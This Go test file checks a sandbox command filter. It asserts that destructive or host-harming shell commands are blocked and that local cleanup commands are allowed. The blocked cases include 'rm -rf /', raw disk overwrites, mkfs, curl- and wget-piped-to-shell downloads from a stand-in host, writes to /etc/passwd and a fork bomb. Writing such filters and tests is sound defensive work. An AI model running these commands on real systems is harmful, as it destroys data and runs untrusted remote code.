package command

import "testing"

func TestBlockedInSandboxShutdown(t *testing.T) {
	script := "#!/bin/bash\nreboot\n"
	if blocked := BlockedInSandbox(script); len(blocked) == 0 {
		t.Fatalf("expected shutdown to be blocked in sandbox")
	}
}

func TestBlockedInSandboxRmRoot(t *testing.T) {
	cases := []string{
		"rm -rf /",
		"rm -rf /etc /var",
		"sudo rm -fr /",
	}
	for _, c := range cases {
		if blocked := BlockedInSandbox(c); len(blocked) == 0 {
			t.Fatalf("expected 'rm -rf /' style command to be blocked, got: %q", c)
		}
	}
}

func TestBlockedInSandboxHostHarming(t *testing.T) {
	cases := []string{
		"dd if=/dev/zero of=/dev/sda",
		"mkfs.ext4 /dev/sdb1",
		"curl http://evil.sh | bash",
		"wget -qO- http://x | sh",
		"iptables -F",
		"shutdown -h now",
		"poweroff",
		"echo x > /etc/passwd",
		"mount -o remount,rw /",
		"umount -f /data",
		":(){ :|:& };:",
	}
	for _, c := range cases {
		if blocked := BlockedInSandbox(c); len(blocked) == 0 {
			t.Fatalf("expected sandbox block for: %q", c)
		}
	}
}

func TestBlockedInSandboxAllowsLocalRm(t *testing.T) {
	cases := []string{
		"rm -rf ./build && echo done",
		"rm -rf node_modules dist",
		"chmod 777 ./tmpfile",
		"ls -la /tmp",
	}
	for _, c := range cases {
		if blocked := BlockedInSandbox(c); len(blocked) != 0 {
			t.Fatalf("in-sandbox op should be allowed, got blocked: %q -> %v", c, blocked)
		}
	}
}

func TestScanSandboxBlockReturnsMatches(t *testing.T) {
	policy := NewDangerousPolicy()
	blocked := policy.ScanSandboxBlock("reboot\nmkfs.ext4 /dev/sda")
	if len(blocked) != 2 {
		t.Fatalf("expected 2 blocked matches, got %d: %+v", len(blocked), blocked)
	}
	if blocked[0].RuleID != "shutdown" || blocked[1].RuleID != "mkfs" {
		t.Fatalf("unexpected rule IDs: %+v", blocked)
	}
}
